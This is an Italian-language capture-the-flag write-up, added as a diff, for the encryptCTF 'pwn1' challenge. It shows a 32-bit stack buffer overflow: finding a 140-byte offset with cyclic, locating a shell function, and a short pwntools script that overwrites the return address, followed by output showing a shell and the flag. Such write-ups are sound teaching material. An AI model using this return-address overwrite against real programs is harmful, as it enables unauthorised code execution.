@@ -1,0 +1,39 @@
+1)pwn1
+  Osserviamo grazie a gdb intanto che siamo su in architettura a 32 bit.
+  STACK:
+  	.......
+  	buffer[128]
+  	ptr alla base
+  	ind di ritorno
+  	
+  Cerchiamo di capire grazie al cyclic, l'offset tra inizio del buffer e l'inizio dell'indirizzo di ritorno
+    cyclic -l 0x6261616b
+    Finding cyclic pattern of 4 bytes: b'kaab' (hex: 0x6b616162)
+    Found at offset 140
+    =>dopo 140 Bytes inizia l'inidirizzo di ritorno
+  
+  Cerco l'indirizzo della funzione shell (gdb)
+    =>0x080484ad
+  
+  Con questi ingredienti siamo pronti a generare il payload.
+  	from pwn import *
+  	p=process('./pwn1')
+  	garbage=b'A'*140
+  	target=p32(0x080484ad)
+  	payload=garbage + target
+  	p.sendline(payload)
+  	p.interactive()
+  
+  python3 exploit.py
+    [+] Starting local process './pwn1': pid 19120
+    [*] Switching to interactive mode
+    
+    $ ls
+    description.txt  flag.txt  peda-session-pwn1.txt  pwn1.c
+    exploit.py     HINTS       pwn1
+    $ cat flag.txt
+    encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}
+    $  
+
+2)hi
+
